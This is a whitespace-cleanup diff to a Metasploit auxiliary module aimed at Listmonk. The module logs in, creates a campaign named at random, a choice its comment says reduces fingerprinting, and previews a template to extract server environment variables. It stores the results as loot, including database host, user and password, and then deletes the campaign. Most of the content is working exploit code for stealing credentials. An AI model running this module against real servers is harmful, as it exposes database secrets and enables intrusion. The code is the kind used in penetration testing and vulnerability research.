@@ -48,11 +48,11 @@ class MetasploitModule < Msf::Auxiliary
     rescue Msf::Exploit::Failed
       return Msf::Exploit::CheckCode::Unknown('Authentication failed')
     end
-    
+
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'about'),
-      'keep_cookies' => true,
+      'keep_cookies' => true
     })
 
     return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res
@@ -61,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
       begin
         json = res.get_json_document
         return Msf::Exploit::CheckCode::Unknown('Failed to parse version information') unless json
-        
+
         if json['version']
           version_string = json['version'].gsub(/^v/, '')
           version = Rex::Version.new(version_string)
@@ -86,15 +86,15 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true
     })
 
-      fail_with(Failure::Unreachable, 'Connection failed') unless res
+    fail_with(Failure::Unreachable, 'Connection failed') unless res
 
-  html = res.get_html_document
-  fail_with(Failure::UnexpectedReply, 'Could not parse HTML login page') unless html
+    html = res.get_html_document
+    fail_with(Failure::UnexpectedReply, 'Could not parse HTML login page') unless html
 
-  nonce = html.at('input[@name="nonce"]/@value')
-  fail_with(Failure::UnexpectedReply, 'Could not extract nonce from login page') unless nonce
+    nonce = html.at('input[@name="nonce"]/@value')
+    fail_with(Failure::UnexpectedReply, 'Could not extract nonce from login page') unless nonce
 
-  nonce.text
+    nonce.text
   end
 
   def login
@@ -112,8 +112,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
 
-      fail_with(Failure::Unreachable, 'Connection failed during login') unless res
-   
+    fail_with(Failure::Unreachable, 'Connection failed during login') unless res
 
     if res.code == 302
       print_good('Login successful')
@@ -125,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
   def create_campaign
     # Use random campaign name to avoid collisions on re-runs and reduce fingerprinting
     campaign_name = datastore['CAMPAIGN_NAME'] || Rex::Text.rand_text_alpha(8..12)
-    
+
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'api', 'campaigns'),
@@ -147,14 +146,14 @@ class MetasploitModule < Msf::Auxiliary
       }.to_json
     })
 
-      fail_with(Failure::Unreachable, 'Connection failed during campaign creation') unless res
+    fail_with(Failure::Unreachable, 'Connection failed during campaign creation') unless res
 
     if res.code == 200
       begin
         parsed = res.get_json_document
-	fail_with(Failure::UnexpectedReply, 'Failed to parse campaign creation response') unless parsed
+        fail_with(Failure::UnexpectedReply, 'Failed to parse campaign creation response') unless parsed
 
-	campaign_id = parsed['data']['id']
+        campaign_id = parsed['data']['id']
         vprint_status("Campaign created with ID: #{campaign_id}")
         return campaign_id
       rescue JSON::ParserError
@@ -177,17 +176,16 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
 
-      fail_with(Failure::Unreachable, 'Connection failed during preview') unless res
+    fail_with(Failure::Unreachable, 'Connection failed during preview') unless res
 
     fail_with(Failure::Unknown, "Preview failed with code: #{res.code}") unless res.code == 200
-   extract_results(res.body)
-    
+    extract_results(res.body)
   end
 
   def default_env_vars
     [
       'LISTMONK_db__host',
-      'LISTMONK_db__port', 
+      'LISTMONK_db__port',
       'LISTMONK_db__user',
       'LISTMONK_db__password',
       'LISTMONK_db__database',
@@ -210,14 +208,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def extract_results(html)
-     doc = Nokogiri::HTML(html)
-     wrap_div = doc.at('div[@class="wrap"]')
-     fail_with(Failure::UnexpectedReply, 'Could not find wrap div in response') unless wrap_div
+    doc = Nokogiri::HTML(html)
+    wrap_div = doc.at('div[@class="wrap"]')
+    fail_with(Failure::UnexpectedReply, 'Could not find wrap div in response') unless wrap_div
 
-     paragraphs = wrap_div.search('p').map(&:text).map(&:strip).reject(&:empty?)
+    paragraphs = wrap_div.search('p').map(&:text).map(&:strip).reject(&:empty?)
 
-      if paragraphs.any?
-  	  results = paragraphs
+    if paragraphs.any?
+      results = paragraphs
 
       clean_results = []
       results.each do |p|
@@ -230,10 +228,9 @@ class MetasploitModule < Msf::Auxiliary
       if clean_results.any?
         print_good('Environment variable(s) extracted:')
         print_line('')
-	clean_results.each do |result|
-	  print_line(result.to_s)
-	end
-
+        clean_results.each do |result|
+          print_line(result.to_s)
+        end
 
         loot_data = clean_results.join("\n")
         store_loot(
@@ -278,7 +275,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Executing template to extract environment variables...')
     preview_campaign(campaign_id, payload)
-    
+
     # Clean up by deleting the campaign
     delete_campaign(campaign_id)
   end
